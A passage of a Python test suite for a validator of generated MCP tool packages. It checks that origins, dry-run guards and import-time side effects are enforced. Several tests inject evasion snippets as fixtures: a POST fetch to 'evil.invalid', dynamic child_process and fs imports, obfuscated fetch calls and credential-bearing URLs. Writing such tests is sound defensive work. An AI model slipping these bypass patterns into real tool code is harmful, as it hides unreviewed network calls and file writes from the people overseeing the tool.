        diagnostics = validator_module.Diagnostics()
        origins = validator_module.validate_vnext_runtime_contract(
            canonical,
            {"https://application.example", "https://unused.example"},
            diagnostics,
        )
        self.assertEqual(origins, {"https://application.example"})
        self.assertTrue(
            any("must exactly equal all HTTP(S) origins" in item for item in diagnostics.errors),
            diagnostics.errors,
        )

        canonical["capabilities"][0]["implementation"]["steps"][0]["url"] = (
            "https://user:secret@application.example/api/topics"
        )
        diagnostics = validator_module.Diagnostics()
        validator_module.validate_vnext_runtime_contract(canonical, set(), diagnostics)
        self.assertTrue(
            any("without embedded credentials" in item for item in diagnostics.errors),
            diagnostics.errors,
        )

        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            profile = json.loads((candidate / "export-profile.json").read_text(encoding="utf-8"))
            profile["allowedRuntimeOrigins"] = ["https://user:secret@application.example"]
            diagnostics = validator_module.Diagnostics()
            validator_module.validate_profile(profile, diagnostics, vnext=True)
        self.assertTrue(
            any("without path, query, or credentials" in item for item in diagnostics.errors),
            diagnostics.errors,
        )

        for malformed in ("https://[bad", "https://:443"):
            with self.subTest(malformed=malformed):
                profile["allowedRuntimeOrigins"] = [malformed]
                diagnostics = validator_module.Diagnostics()
                validator_module.validate_profile(profile, diagnostics, vnext=True)
                self.assertTrue(
                    any("allowedRuntimeOrigins[0]" in item for item in diagnostics.errors),
                    diagnostics.errors,
                )

    def test_vnext_local_runtime_requires_empty_origins_and_closed_world_annotation(self) -> None:
        canonical = {
            "capabilities": [{
                "capabilityId": "list-knowledge-topics",
                "annotations": {"openWorldHint": False},
                "implementation": {"kind": "local"},
            }],
        }
        diagnostics = validator_module.Diagnostics()
        origins = validator_module.validate_vnext_runtime_contract(canonical, set(), diagnostics)
        self.assertEqual(origins, set())
        self.assertEqual(diagnostics.errors, [])

        canonical["capabilities"][0]["annotations"]["openWorldHint"] = True
        diagnostics = validator_module.Diagnostics()
        validator_module.validate_vnext_runtime_contract(
            canonical,
            {"https://application.example"},
            diagnostics,
        )
        self.assertTrue(
            any("openWorldHint" in item and "false" in item for item in diagnostics.errors),
            diagnostics.errors,
        )
        self.assertTrue(
            any("must exactly equal all HTTP(S) origins" in item for item in diagnostics.errors),
            diagnostics.errors,
        )

    def test_vnext_http_runtime_requires_open_world_annotation(self) -> None:
        canonical = {
            "capabilities": [{
                "capabilityId": "list-knowledge-topics",
                "annotations": {"openWorldHint": False},
                "implementation": {
                    "kind": "http",
                    "steps": [{"url": "https://application.example/api/topics"}],
                },
            }],
        }
        diagnostics = validator_module.Diagnostics()
        validator_module.validate_vnext_runtime_contract(
            canonical,
            {"https://application.example"},
            diagnostics,
        )
        self.assertTrue(
            any("openWorldHint" in item and "true" in item for item in diagnostics.errors),
            diagnostics.errors,
        )

    def test_vnext_mcp_annotation_matches_function_runtime_kind(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            runtime = candidate / "mcp-tool/index.mjs"
            runtime.write_text(
                runtime.read_text(encoding="utf-8").replace(
                    "openWorldHint: false",
                    "openWorldHint: true",
                ),
                encoding="utf-8",
            )
            diagnostics = validator_module.Diagnostics()
            validator_module.validate_runtime(
                candidate,
                vnext_capabilities(candidate),
                "CODE2SKILL_DRY_RUN",
                diagnostics,
                vnext=True,
            )
        self.assertTrue(
            any("annotations.openWorldHint must be false" in item for item in diagnostics.errors),
            diagnostics.errors,
        )

    def test_vnext_local_function_rejects_network_calls(self) -> None:
        network_bodies = (
            "const response = await fetch('https://application.example/api/topics');",
            "const response = await context['fetch']('https://application.example/api/topics');",
            "const invoke = context.request; const response = await invoke('/api/topics');",
            "const { fetch: invoke } = context; const response = await invoke('https://application.example/api/topics');",
        )
        for network_body in network_bodies:
            with self.subTest(network_body=network_body), tempfile.TemporaryDirectory() as directory:
                candidate = create_base(Path(directory))
                (candidate / "function-core/index.mjs").write_text(
                    "export async function listKnowledgeTopics(input, context = {}) { "
                    f"{network_body} "
                    "return {status: response.status, data: {topics: []}}; }\n",
                    encoding="utf-8",
                )
                diagnostics = validator_module.Diagnostics()
                validator_module.validate_runtime(
                    candidate,
                    vnext_capabilities(candidate),
                    "CODE2SKILL_DRY_RUN",
                    diagnostics,
                    vnext=True,
                    allowed_runtime_origins=set(),
                )
                self.assertTrue(
                    any("local Function" in item and "network calls" in item for item in diagnostics.errors),
                    diagnostics.errors,
                )

    def test_vnext_http_function_literal_origin_must_come_from_canonical_steps(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            capabilities = vnext_capabilities(candidate)
            capability = next(iter(capabilities.values()))
            capability["implementation"] = {
                "kind": "http",
                "steps": [{"url": "https://application.example/api/topics"}],
            }
            capability["successRule"]["kind"] = "http_status_and_output"
            (candidate / "function-core/index.mjs").write_text(
                "export async function listKnowledgeTopics(input, context = {}) { "
                "const response = await context.fetch('https://unapproved.example/api/topics'); "
                "if (response.status !== 200) throw new Error('failed'); "
                "return {status: response.status, data: {topics: []}}; }\n",
                encoding="utf-8",
            )
            diagnostics = validator_module.Diagnostics()
            validator_module.validate_runtime(
                candidate,
                capabilities,
                "CODE2SKILL_DRY_RUN",
                diagnostics,
                vnext=True,
                allowed_runtime_origins={"https://application.example"},
            )
        self.assertTrue(
            any("literal origin `https://unapproved.example`" in item for item in diagnostics.errors),
            diagnostics.errors,
        )

    def test_vnext_http_function_rejects_dynamic_or_same_origin_wrong_targets(self) -> None:
        bodies = (
            "const response = await context.fetch(input.url);",
            "const response = await context.fetch('https://application.example/api/not-canonical');",
            "const response = await context.fetch('https://application.example/api/topics' + input.suffix);",
        )
        for body in bodies:
            with self.subTest(body=body), tempfile.TemporaryDirectory() as directory:
                candidate = create_base(Path(directory))
                capabilities = vnext_capabilities(candidate)
                capability = next(iter(capabilities.values()))
                capability["implementation"] = {
                    "kind": "http",
                    "steps": [{"url": "https://application.example/api/topics"}],
                }
                capability["successRule"]["kind"] = "http_status_and_output"
                (candidate / "function-core/index.mjs").write_text(
                    "export async function listKnowledgeTopics(input, context = {}) { "
                    f"{body} "
                    "if (response.status !== 200) throw new Error('failed'); "
                    "return {status: response.status, data: {topics: []}}; }\n",
                    encoding="utf-8",
                )
                diagnostics = validator_module.Diagnostics()
                validator_module.validate_runtime(
                    candidate,
                    capabilities,
                    "CODE2SKILL_DRY_RUN",
                    diagnostics,
                    vnext=True,
                    allowed_runtime_origins={"https://application.example"},
                )

            self.assertTrue(
                any(
                    "dynamic network target" in item
                    or "without a dynamic suffix" in item
                    or "URL literals must exactly equal" in item
                    for item in diagnostics.errors
                ),
                diagnostics.errors,
            )

    def test_vnext_callback_cannot_terminate_early_or_replace_tool_input(self) -> None:
        replacements = (
            (
                "const functionResult = await listKnowledgeTopics(input, runtimeContext);",
                "if (true) { return {structuredContent: {status: 'fake'}, content: [], isError: false}; } "
                "const functionResult = await listKnowledgeTopics(input, runtimeContext);",
            ),
            (
                "const functionResult = await listKnowledgeTopics(input, runtimeContext);",
                "const functionResult = await listKnowledgeTopics({}, runtimeContext);",
            ),
            (
                "const functionResult = await listKnowledgeTopics(input, runtimeContext); "
                "return {structuredContent: functionResult, content: [{type: 'text', text: JSON.stringify(functionResult)}], isError: false};",
                "if (input.useFunction) { const functionResult = await listKnowledgeTopics(input, runtimeContext); "
                "return {structuredContent: functionResult, content: [{type: 'text', text: JSON.stringify(functionResult)}], isError: false}; }",
            ),
        )
        for original, replacement in replacements:
            with self.subTest(replacement=replacement), tempfile.TemporaryDirectory() as directory:
                candidate = create_base(Path(directory))
                runtime = candidate / "mcp-tool/index.mjs"
                runtime.write_text(
                    runtime.read_text(encoding="utf-8").replace(original, replacement),
                    encoding="utf-8",
                )
                diagnostics = validator_module.Diagnostics()
                validator_module.validate_runtime(
                    candidate,
                    vnext_capabilities(candidate),
                    "CODE2SKILL_DRY_RUN",
                    diagnostics,
                    vnext=True,
                )

            self.assertTrue(
                any(
                    "must not terminate" in item
                    or "must pass the exact Tool input" in item
                    or "must directly project" in item
                    for item in diagnostics.errors
                ),
                diagnostics.errors,
            )

    def test_vnext_function_cannot_reassign_input_or_context(self) -> None:
        for target in ("input", "context"):
            with self.subTest(target=target), tempfile.TemporaryDirectory() as directory:
                candidate = create_base(Path(directory))
                function_path = candidate / "function-core/index.mjs"
                function_path.write_text(
                    "export async function listKnowledgeTopics(input, context = {}) { "
                    f"{target} = {{}}; "
                    "return {status: 'success', data: {topics: []}}; }\n",
                    encoding="utf-8",
                )
                diagnostics = validator_module.Diagnostics()
                validator_module.validate_runtime(
                    candidate,
                    vnext_capabilities(candidate),
                    "CODE2SKILL_DRY_RUN",
                    diagnostics,
                    vnext=True,
                )

            self.assertTrue(
                any("must not reassign" in item for item in diagnostics.errors),
                diagnostics.errors,
            )

        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            capabilities = vnext_capabilities(candidate)
            capability = next(iter(capabilities.values()))
            capability["implementation"] = {
                "kind": "http",
                "steps": [{"url": "https://application.example/api/topics"}],
            }
            (candidate / "function-core/index.mjs").write_text(
                "const API = 'https://unapproved.example/api/topics'; "
                "export async function listKnowledgeTopics(input, context = {}) { "
                "const response = await context.fetch(API); "
                "return {status: response.status, data: {topics: []}}; }\n",
                encoding="utf-8",
            )
            diagnostics = validator_module.Diagnostics()
            validator_module.validate_runtime(
                candidate,
                capabilities,
                "CODE2SKILL_DRY_RUN",
                diagnostics,
                vnext=True,
                allowed_runtime_origins={"https://application.example"},
            )
        self.assertTrue(
            any("literal origin `https://unapproved.example`" in item for item in diagnostics.errors),
            diagnostics.errors,
        )

    def test_vnext_callback_call_cannot_be_impersonated_by_comment_or_dead_code(self) -> None:
        replacements = (
            (
                "const functionResult = await listKnowledgeTopics(input, runtimeContext);",
                "/* const functionResult = await listKnowledgeTopics(input, runtimeContext); */ "
                "const functionResult = {status: 'fake', data: {topics: []}};",
            ),
            (
                "const functionResult = await listKnowledgeTopics(input, runtimeContext);",
                "if (false) { const ignored = await listKnowledgeTopics(input, runtimeContext); } "
                "const functionResult = {status: 'fake', data: {topics: []}};",
            ),
        )
        for original, replacement in replacements:
            with self.subTest(replacement=replacement), tempfile.TemporaryDirectory() as directory:
                candidate = create_base(Path(directory))
                runtime = candidate / "mcp-tool/index.mjs"
                runtime.write_text(
                    runtime.read_text(encoding="utf-8").replace(original, replacement),
                    encoding="utf-8",
                )
                diagnostics = validator_module.Diagnostics()
                validator_module.validate_runtime(
                    candidate,
                    vnext_capabilities(candidate),
                    "CODE2SKILL_DRY_RUN",
                    diagnostics,
                    vnext=True,
                )
                self.assertTrue(
                    any("must call exactly its Canonical Function export" in item for item in diagnostics.errors),
                    diagnostics.errors,
                )

    def test_vnext_callback_cannot_call_another_function_export(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            function_core = candidate / "function-core/index.mjs"
            function_core.write_text(
                function_core.read_text(encoding="utf-8")
                + "export async function unrelatedFunction(input) { return {status: 'wrong', data: {}}; }\n",
                encoding="utf-8",
            )
            runtime = candidate / "mcp-tool/index.mjs"
            runtime.write_text(
                runtime.read_text(encoding="utf-8").replace(
                    "await listKnowledgeTopics(input, runtimeContext)",
                    "await unrelatedFunction(input, runtimeContext)",
                ),
                encoding="utf-8",
            )
            capabilities = vnext_capabilities(candidate)
            capabilities["unrelated-function"] = {"functionExport": "unrelatedFunction"}
            diagnostics = validator_module.Diagnostics()
            validator_module.validate_runtime(
                candidate,
                capabilities,
                "CODE2SKILL_DRY_RUN",
                diagnostics,
                vnext=True,
            )
        self.assertTrue(
            any("must call exactly its Canonical Function export" in item for item in diagnostics.errors),
            diagnostics.errors,
        )

    def test_vnext_callback_rejects_duplicate_or_template_hidden_function_calls(self) -> None:
        mutations = (
            "await listKnowledgeTopics(input, runtimeContext); ",
            "const hidden = `${await unrelatedFunction(input)}`; ",
        )
        for mutation in mutations:
            with self.subTest(mutation=mutation), tempfile.TemporaryDirectory() as directory:
                candidate = create_base(Path(directory))
                function_core = candidate / "function-core/index.mjs"
                function_core.write_text(
                    function_core.read_text(encoding="utf-8")
                    + "export async function unrelatedFunction(input) { return {status: 'wrong', data: {}}; }\n",
                    encoding="utf-8",
                )
                runtime = candidate / "mcp-tool/index.mjs"
                runtime.write_text(
                    runtime.read_text(encoding="utf-8").replace(
                        "const functionResult = await listKnowledgeTopics(input, runtimeContext);",
                        mutation + "const functionResult = await listKnowledgeTopics(input, runtimeContext);",
                    ),
                    encoding="utf-8",
                )
                capabilities = vnext_capabilities(candidate)
                capabilities["unrelated-function"] = {"functionExport": "unrelatedFunction"}
                diagnostics = validator_module.Diagnostics()
                validator_module.validate_runtime(
                    candidate,
                    capabilities,
                    "CODE2SKILL_DRY_RUN",
                    diagnostics,
                    vnext=True,
                )
                self.assertTrue(
                    any("must call exactly its Canonical Function export" in item for item in diagnostics.errors),
                    diagnostics.errors,
                )

    def test_vnext_callback_success_must_directly_project_function_result(self) -> None:
        replacements = (
            "structuredContent: {...functionResult}",
            "structuredContent: functionResult, ...{structuredContent: {status: 'fake'}}",
        )
        for replacement in replacements:
            with self.subTest(replacement=replacement), tempfile.TemporaryDirectory() as directory:
                candidate = create_base(Path(directory))
                runtime = candidate / "mcp-tool/index.mjs"
                runtime.write_text(
                    runtime.read_text(encoding="utf-8").replace(
                        "structuredContent: functionResult",
                        replacement,
                    ),
                    encoding="utf-8",
                )
                diagnostics = validator_module.Diagnostics()
                validator_module.validate_runtime(
                    candidate,
                    vnext_capabilities(candidate),
                    "CODE2SKILL_DRY_RUN",
                    diagnostics,
                    vnext=True,
                )
                self.assertTrue(
                    any("successful result must directly project" in item for item in diagnostics.errors),
                    diagnostics.errors,
                )

    def test_vnext_success_and_error_envelopes_cannot_hide_dispatch_expressions(self) -> None:
        mutations = (
            (
                "structuredContent: functionResult",
                "structuredContent: (runtimeContext.dispatch(input), functionResult)",
            ),
            (
                "JSON.stringify(functionResult)",
                "JSON.stringify((runtimeContext.dispatch(input), functionResult))",
            ),
            (
                "structuredContent: toolError",
                "structuredContent: (runtimeContext.dispatch(input), toolError)",
            ),
            (
                "JSON.stringify(toolError)",
                "JSON.stringify((runtimeContext.dispatch(input), toolError))",
            ),
        )
        for original, replacement in mutations:
            with self.subTest(replacement=replacement), tempfile.TemporaryDirectory() as directory:
                candidate = create_base(Path(directory))
                runtime = candidate / "mcp-tool/index.mjs"
                runtime.write_text(
                    runtime.read_text(encoding="utf-8").replace(original, replacement, 1),
                    encoding="utf-8",
                )
                diagnostics = validator_module.Diagnostics()
                validator_module.validate_runtime(
                    candidate,
                    vnext_capabilities(candidate),
                    "CODE2SKILL_DRY_RUN",
                    diagnostics,
                    vnext=True,
                )
                self.assertTrue(
                    any(
                        "exact try/success projection" in item
                        or "successful result must directly project" in item
                        for item in diagnostics.errors
                    ),
                    diagnostics.errors,
                )

    def test_vnext_callback_call_after_unconditional_return_is_dead(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            runtime = candidate / "mcp-tool/index.mjs"
            runtime.write_text(
                runtime.read_text(encoding="utf-8").replace(
                    "const functionResult = await listKnowledgeTopics(input, runtimeContext);",
                    "return {structuredContent: {status: 'fake'}, content: [], isError: false}; "
                    "const functionResult = await listKnowledgeTopics(input, runtimeContext);",
                ),
                encoding="utf-8",
            )
            diagnostics = validator_module.Diagnostics()
            validator_module.validate_runtime(
                candidate,
                vnext_capabilities(candidate),
                "CODE2SKILL_DRY_RUN",
                diagnostics,
                vnext=True,
            )
        self.assertTrue(
            any(
                "successful result must directly project" in item
                or "must not terminate before" in item
                for item in diagnostics.errors
            ),
            diagnostics.errors,
        )

    def test_vnext_dry_run_guard_must_precede_function_call(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            runtime = candidate / "mcp-tool/index.mjs"
            source = runtime.read_text(encoding="utf-8")
            guard = (
                "if (process.env.CODE2SKILL_DRY_RUN === '1') { "
                "const dryRunResult = {dryRun: true, validatedInput: input, operationPolicy: {}, operationSummary: {}}; "
                "return {structuredContent: dryRunResult, content: [{type: 'text', text: JSON.stringify(dryRunResult)}], isError: false}; } "
            )
            call = "const functionResult = await listKnowledgeTopics(input, runtimeContext); "
            runtime.write_text(
                source.replace(guard + "try { " + call, "try { " + call + guard),
                encoding="utf-8",
            )
            diagnostics = validator_module.Diagnostics()
            validator_module.validate_runtime(
                candidate,
                vnext_capabilities(candidate),
                "CODE2SKILL_DRY_RUN",
                diagnostics,
                vnext=True,
            )
        self.assertTrue(
            any("dry-run guard must return before" in item for item in diagnostics.errors),
            diagnostics.errors,
        )

    def test_vnext_dry_run_guard_requires_unconditional_return_before_external_calls(self) -> None:
        mutations = (
            (
                "const dryRunResult =",
                "if (false) return; const dryRunResult =",
            ),
            (
                "if (process.env.CODE2SKILL_DRY_RUN === '1')",
                "writeFileSync('/tmp/should-not-run', 'x'); if (process.env.CODE2SKILL_DRY_RUN === '1')",
            ),
        )
        for original, replacement in mutations:
            with self.subTest(replacement=replacement), tempfile.TemporaryDirectory() as directory:
                candidate = create_base(Path(directory))
                runtime = candidate / "mcp-tool/index.mjs"
                source = runtime.read_text(encoding="utf-8").replace(original, replacement, 1)
                runtime.write_text(source, encoding="utf-8")
                diagnostics = validator_module.Diagnostics()
                validator_module.validate_runtime(
                    candidate,
                    vnext_capabilities(candidate),
                    "CODE2SKILL_DRY_RUN",
                    diagnostics,
                    vnext=True,
                )
                self.assertTrue(
                    any("dry-run guard must return before" in item for item in diagnostics.errors),
                    diagnostics.errors,
                )

    def test_vnext_dry_run_requires_matching_content_projection(self) -> None:
        mutations = (
            (
                "content: [{type: 'text', text: JSON.stringify(dryRunResult)}], ",
                "",
            ),
            (
                "JSON.stringify(dryRunResult)",
                "JSON.stringify(input)",
            ),
        )
        for original, replacement in mutations:
            with self.subTest(replacement=replacement), tempfile.TemporaryDirectory() as directory:
                candidate = create_base(Path(directory))
                runtime = candidate / "mcp-tool/index.mjs"
                runtime.write_text(
                    runtime.read_text(encoding="utf-8").replace(original, replacement, 1),
                    encoding="utf-8",
                )
                diagnostics = validator_module.Diagnostics()
                validator_module.validate_runtime(
                    candidate,
                    vnext_capabilities(candidate),
                    "CODE2SKILL_DRY_RUN",
                    diagnostics,
                    vnext=True,
                )
                self.assertTrue(
                    any("exact matching content plus structuredContent" in item for item in diagnostics.errors),
                    diagnostics.errors,
                )

    def test_vnext_dry_run_policy_and_summary_must_be_inert_json_literals(self) -> None:
        mutations = (
            (
                "operationPolicy: {}",
                "operationPolicy: (runtimeContext.dispatch(input), {})",
            ),
            (
                "operationSummary: {}",
                "operationSummary: (runtimeContext.dispatch(input), {})",
            ),
        )
        for original, replacement in mutations:
            with self.subTest(replacement=replacement), tempfile.TemporaryDirectory() as directory:
                candidate = create_base(Path(directory))
                runtime = candidate / "mcp-tool/index.mjs"
                runtime.write_text(
                    runtime.read_text(encoding="utf-8").replace(original, replacement, 1),
                    encoding="utf-8",
                )
                diagnostics = validator_module.Diagnostics()
                validator_module.validate_runtime(
                    candidate,
                    vnext_capabilities(candidate),
                    "CODE2SKILL_DRY_RUN",
                    diagnostics,
                    vnext=True,
                )
                self.assertTrue(
                    any("dry-run guard must return before" in item for item in diagnostics.errors),
                    diagnostics.errors,
                )

    def test_vnext_modules_cannot_execute_external_effects_during_import(self) -> None:
        mutations = (
            (
                "function-core/index.mjs",
                "await fetch('https://application.example/import-side-effect');\n",
                "module initialization and helper definitions",
            ),
            (
                "mcp-tool/index.mjs",
                "await fetch('https://application.example/import-side-effect'); ",
                "module initialization must not invoke",
            ),
        )
        for relative, prefix, expected in mutations:
            with self.subTest(relative=relative), tempfile.TemporaryDirectory() as directory:
                candidate = create_base(Path(directory))
                runtime = candidate / relative
                runtime.write_text(
                    prefix + runtime.read_text(encoding="utf-8"),
                    encoding="utf-8",
                )
                diagnostics = validator_module.Diagnostics()
                validator_module.validate_runtime(
                    candidate,
                    vnext_capabilities(candidate),
                    "CODE2SKILL_DRY_RUN",
                    diagnostics,
                    vnext=True,
                )
                self.assertTrue(
                    any(expected in item for item in diagnostics.errors),
                    diagnostics.errors,
                )

    def test_vnext_modules_and_tool_config_cannot_call_canonical_functions_during_import(self) -> None:
        mutations = (
            (
                "function-core/index.mjs",
                "listKnowledgeTopics({}, {});\n",
                "must not invoke a Canonical Function",
            ),
            (
                "mcp-tool/index.mjs",
                "listKnowledgeTopics({}, {}); ",
                "must not invoke a Canonical Function",
            ),
        )
        for relative, prefix, expected in mutations:
            with self.subTest(relative=relative), tempfile.TemporaryDirectory() as directory:
                candidate = create_base(Path(directory))
                path = candidate / relative
                path.write_text(prefix + path.read_text(encoding="utf-8"), encoding="utf-8")
                diagnostics = validator_module.Diagnostics()
                validator_module.validate_runtime(
                    candidate,
                    vnext_capabilities(candidate),
                    "CODE2SKILL_DRY_RUN",
                    diagnostics,
                    vnext=True,
                )
                self.assertTrue(
                    any(expected in item for item in diagnostics.errors),
                    diagnostics.errors,
                )

        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            path = candidate / "mcp-tool/index.mjs"
            path.write_text(
                path.read_text(encoding="utf-8").replace(
                    "title: '知识主题：列出可用主题'",
                    "initializationEffect: listKnowledgeTopics({}, {}), "
                    "title: '知识主题：列出可用主题'",
                    1,
                ),
                encoding="utf-8",
            )
            diagnostics = validator_module.Diagnostics()
            validator_module.validate_runtime(
                candidate,
                vnext_capabilities(candidate),
                "CODE2SKILL_DRY_RUN",
                diagnostics,
                vnext=True,
            )
            self.assertTrue(
                any(
                    "config must contain exactly" in item
                    or "config must be inert data" in item
                    for item in diagnostics.errors
                ),
                diagnostics.errors,
            )

    def test_vnext_import_time_web_sockets_are_external_effects(self) -> None:
        cases = (
            ("function-core/index.mjs", "new WebSocket('wss://application.example/socket');\n", "module initialization"),
            ("mcp-tool/index.mjs", "new WebSocket('wss://application.example/socket');\n", "module initialization"),
            (
                "mcp-tool/runtime.mjs",
                "(() => { new WebSocket('wss://application.example/socket'); })();\n",
                "stdio-only bundled runtime",
            ),
        )
        for relative, mutation, expected in cases:
            with self.subTest(relative=relative), tempfile.TemporaryDirectory() as directory:
                candidate = create_base(Path(directory))
                path = candidate / relative
                path.write_text(
                    mutation + path.read_text(encoding="utf-8"),
                    encoding="utf-8",
                )
                diagnostics = validator_module.Diagnostics()
                validator_module.validate_runtime(
                    candidate,
                    vnext_capabilities(candidate),
                    "CODE2SKILL_DRY_RUN",
                    diagnostics,
                    vnext=True,
                )
                self.assertTrue(
                    any(expected in item for item in diagnostics.errors),
                    diagnostics.errors,
                )

    def test_vnext_tool_config_cannot_execute_an_import_time_effect(self) -> None:
        mutations = (
            "fetch('https://application.example/config-effect')",
            "globalThis['fe' + 'tch']('data:text/plain,blocked')",
        )
        for mutation in mutations:
            with self.subTest(mutation=mutation), tempfile.TemporaryDirectory() as directory:
                candidate = create_base(Path(directory))
                runtime = candidate / "mcp-tool/index.mjs"
                runtime.write_text(
                    runtime.read_text(encoding="utf-8").replace(
                        "title: '知识主题：列出可用主题'",
                        f"registrationProbe: {mutation}, "
                        "title: '知识主题：列出可用主题'",
                        1,
                    ),
                    encoding="utf-8",
                )
                diagnostics = validator_module.Diagnostics()
                validator_module.validate_runtime(
                    candidate,
                    vnext_capabilities(candidate),
                    "CODE2SKILL_DRY_RUN",
                    diagnostics,
                    vnext=True,
                )

                self.assertTrue(
                    any("config must be inert data" in item for item in diagnostics.errors),
                    diagnostics.errors,
                )

    def test_vnext_bundled_runtime_cannot_import_effectful_node_modules(self) -> None:
        mutations = (
            "import { writeFileSync } from 'node:fs'; writeFileSync('/tmp/blocked', 'x');\n",
            "await import('node:child_process');\n",
            "import { createRequire } from 'node:module'; "
            "const hiddenRequire = createRequire(import.meta.url); "
            "hiddenRequire('node:fs').writeFileSync('/tmp/blocked', 'x');\n",
        )
        for mutation in mutations:
            with self.subTest(mutation=mutation), tempfile.TemporaryDirectory() as directory:
                candidate = create_base(Path(directory))
                runtime = candidate / "mcp-tool/runtime.mjs"
                runtime.write_text(
                    runtime.read_text(encoding="utf-8") + mutation,
                    encoding="utf-8",
                )
                diagnostics = validator_module.Diagnostics()
                validator_module.validate_runtime(
                    candidate,
                    vnext_capabilities(candidate),
                    "CODE2SKILL_DRY_RUN",
                    diagnostics,
                    vnext=True,
                )
                self.assertTrue(
                    any("must not import effectful Node module" in item for item in diagnostics.errors),
                    diagnostics.errors,
                )

    def test_vnext_bundled_runtime_cannot_defer_to_uninspected_chunks(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            runtime = candidate / "mcp-tool/runtime.mjs"
            runtime.write_text(
                runtime.read_text(encoding="utf-8")
                + "await import('./side-effect-chunk.mjs');\n",
                encoding="utf-8",
            )
            diagnostics = validator_module.Diagnostics()
            validator_module.validate_runtime(
                candidate,
                vnext_capabilities(candidate),
                "CODE2SKILL_DRY_RUN",
                diagnostics,
                vnext=True,
            )

        self.assertTrue(
            any("must be one self-contained file" in item for item in diagnostics.errors),
            diagnostics.errors,
        )

    def test_vnext_modules_reject_computed_dynamic_imports(self) -> None:
        mutations = (
            "function-core/index.mjs",
            "mcp-tool/index.mjs",
            "mcp-tool/runtime.mjs",
        )
        for relative in mutations:
            with self.subTest(relative=relative), tempfile.TemporaryDirectory() as directory:
                candidate = create_base(Path(directory))
                path = candidate / relative
                path.write_text(
                    path.read_text(encoding="utf-8")
                    + "const hiddenModule = await import('node:' + 'fs');\n",
                    encoding="utf-8",
                )
                diagnostics = validator_module.Diagnostics()
                validator_module.validate_runtime(
                    candidate,
                    vnext_capabilities(candidate),
                    "CODE2SKILL_DRY_RUN",
                    diagnostics,
                    vnext=True,
                )
                self.assertTrue(
                    any("dynamic import()" in item for item in diagnostics.errors),
                    diagnostics.errors,
                )

    def test_vnext_function_core_cannot_import_effectful_node_modules(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            function_core = candidate / "function-core/index.mjs"
            function_core.write_text(
                "import { writeFileSync } from 'node:fs';\n"
                + function_core.read_text(encoding="utf-8"),
                encoding="utf-8",
            )
            diagnostics = validator_module.Diagnostics()
            validator_module.validate_runtime(
                candidate,
                vnext_capabilities(candidate),
                "CODE2SKILL_DRY_RUN",
                diagnostics,
                vnext=True,
            )

        self.assertTrue(
            any("Function core must not import effectful Node module" in item for item in diagnostics.errors),
            diagnostics.errors,
        )

    def test_vnext_dry_run_guard_must_be_first_even_for_indirect_side_effects(self) -> None:
        mutations = (
            "const hidden = context.writeFileSync; hidden('/tmp/blocked', 'x'); ",
            "const {writeFileSync: hidden} = context; hidden('/tmp/blocked', 'x'); ",
            "let hidden; hidden = context.writeFileSync; hidden('/tmp/blocked', 'x'); ",
            "const first = context.writeFileSync; const hidden = first; hidden.call(null, '/tmp/blocked', 'x'); ",
            "context['writeFileSync']('/tmp/blocked', 'x'); ",
            "context.writeFileSync?.('/tmp/blocked', 'x'); ",
        )
        guard = "if (process.env.CODE2SKILL_DRY_RUN === '1')"
        for mutation in mutations:
            with self.subTest(mutation=mutation), tempfile.TemporaryDirectory() as directory:
                candidate = create_base(Path(directory))
                runtime = candidate / "mcp-tool/index.mjs"
                runtime.write_text(
                    runtime.read_text(encoding="utf-8").replace(
                        guard,
                        mutation + guard,
                        1,
                    ),
                    encoding="utf-8",
                )
                diagnostics = validator_module.Diagnostics()
                validator_module.validate_runtime(
                    candidate,
                    vnext_capabilities(candidate),
                    "CODE2SKILL_DRY_RUN",
                    diagnostics,
                    vnext=True,
                )
                self.assertTrue(
                    any("first executable callback statement" in item for item in diagnostics.errors),
                    diagnostics.errors,
                )

    def test_vnext_callback_cannot_run_adapter_logic_before_canonical_function(self) -> None:
        mutations = (
            "await fetch('https://evil.invalid/bypass', {method: 'POST'}); ",
            "const hidden = context.dispatch; await hidden(input); ",
            "context.writeFileSync?.('/tmp/blocked', 'x'); ",
        )
        call = "const functionResult = await listKnowledgeTopics(input, runtimeContext); "
        for mutation in mutations:
            with self.subTest(mutation=mutation), tempfile.TemporaryDirectory() as directory:
                candidate = create_base(Path(directory))
                runtime = candidate / "mcp-tool/index.mjs"
                runtime.write_text(
                    runtime.read_text(encoding="utf-8").replace(
                        call,
                        mutation + call,
                        1,
                    ),
                    encoding="utf-8",
                )
                diagnostics = validator_module.Diagnostics()
                validator_module.validate_runtime(
                    candidate,
                    vnext_capabilities(candidate),
                    "CODE2SKILL_DRY_RUN",
                    diagnostics,
                    vnext=True,
                )
                self.assertTrue(
                    any("adapter logic and external side effects" in item for item in diagnostics.errors),
                    diagnostics.errors,
                )

    def test_vnext_callback_must_forward_only_trusted_runtime_context(self) -> None:
        mutations = (
            (
                "async (input, runtimeContext) =>",
                "async (input) =>",
                "receive exactly `(input, runtimeContext)`",
            ),
            (
                "listKnowledgeTopics(input, runtimeContext)",
                "listKnowledgeTopics(input, {})",
                "trusted runtimeContext",
            ),
            (
                "listKnowledgeTopics(input, runtimeContext)",
                "listKnowledgeTopics(input, {dispatch: input.dispatch})",
                "trusted runtimeContext",
            ),
            (
                "const functionResult = await listKnowledgeTopics(input, runtimeContext);",
                "runtimeContext = input.context; const functionResult = await listKnowledgeTopics(input, runtimeContext);",
                "must not replace",
            ),
            (
                "const functionResult = await listKnowledgeTopics(input, runtimeContext);",
                "const protectedWorkflowState = input; const functionResult = await listKnowledgeTopics(input, runtimeContext);",
                "must not construct or project Guard",
            ),
        )
        for original, replacement, expected in mutations:
            with self.subTest(replacement=replacement), tempfile.TemporaryDirectory() as directory:
                candidate = create_base(Path(directory))
                runtime = candidate / "mcp-tool/index.mjs"
                runtime.write_text(
                    runtime.read_text(encoding="utf-8").replace(original, replacement, 1),
